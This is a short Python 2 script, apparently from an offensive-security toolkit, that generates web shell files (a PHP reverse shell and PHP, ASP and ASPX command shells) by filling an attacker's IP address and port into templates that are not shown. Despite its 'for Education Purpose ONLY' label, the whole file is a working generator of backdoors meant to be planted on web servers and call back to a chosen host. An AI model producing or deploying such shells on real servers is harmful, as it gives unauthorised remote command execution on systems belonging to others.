#!/usr/bin/env python

import argparse

parser = argparse.ArgumentParser(
		description='Create WebShell for Education Purpose ONLY.',
		epilog='Ex: python createWebShell.py -t php -ip 10.10.10.10 -p 8080 -o myshell.php')

requiredparser = parser.add_argument_group('required arguments')
requiredparser.add_argument('-t',
                metavar='File_Type',
                dest='TYPE',
                required='true',
                help='WebShell file type, options: php, php-cmd, asp, aspx')

requiredparser.add_argument('-ip',
                metavar='ip_Address',
                dest='IP',
                required='true',
                help='Enter local host IP Address')

parser.add_argument('-p',
                metavar='Port',
                dest='PORT',
                default='8080',
                help='Enter local host PORT, Default: 8080')

requiredparser.add_argument('-o',
                metavar='Output_File',
                dest='OUTPUT',
                required='true',
                help='Enter the name of the output file')

args = parser.parse_args()

def f(x):
    return {
        'php': 'rs.php',
	'php-cmd' : 'cmd.php',
        'asp': 'cmd.asp',
	'aspx' : 'cmd.aspx'
    }[x]

srcfile = 'templates/'+f(args.TYPE)

input = open(srcfile)
output = open(args.OUTPUT,'w')

for s in input.xreadlines(  ):
	output.write(s.replace('{{IPADDRESS}}', args.IP).replace('{{PORT}}',args.PORT))

output.close()
input.close()

print '[+] ', args.OUTPUT ,' File was created'
